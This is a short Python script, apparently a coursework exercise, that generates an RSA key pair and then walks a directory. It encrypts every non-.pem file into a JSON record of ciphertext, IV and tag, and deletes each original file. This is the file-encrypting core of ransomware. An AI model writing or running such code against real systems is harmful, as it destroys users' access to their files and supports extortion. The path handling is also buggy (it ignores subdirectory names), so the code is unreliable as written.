import os
import MyRSAEncrypt
import json
import GetRSAKeys
import base64

def Walk(dir):
    GetRSAKeys.getRSAKeys(dir + "/PublicKey.pem", dir + "/PrivateKey.pem")
    for dirName, subdirList, fileList in os.walk(dir):
        for i in fileList:
            if ".pem" not in i:
                (RSACipher, C, IV, tag, ext) = MyRSAEncrypt.MyRSAEncrypt(dir+"/"+i, dir+"/PublicKey.pem")
                with open(dir+"/"+i+".json", 'w') as jsonFile:
                    #turn this stuff inot a dicitonary, define a magic string as a key, the values we have are the values
                    RSACipher = base64.b64encode(RSACipher).decode("ascii")
                    C = base64.b64encode(C).decode("ascii")
                    IV = base64.b64encode(IV).decode("ascii")
                    tag = base64.b64encode(tag).decode("ascii")
                    #ext = base64.b64encode(ext).decode("ascii")
                    #data = (RSACipher, C, IV, tag, ext)
                    json.dump({"RSACipher": RSACipher, "C": C, "IV": IV, "tag": tag, "ext": ext}, jsonFile)
                    os.remove(dir+"/"+i)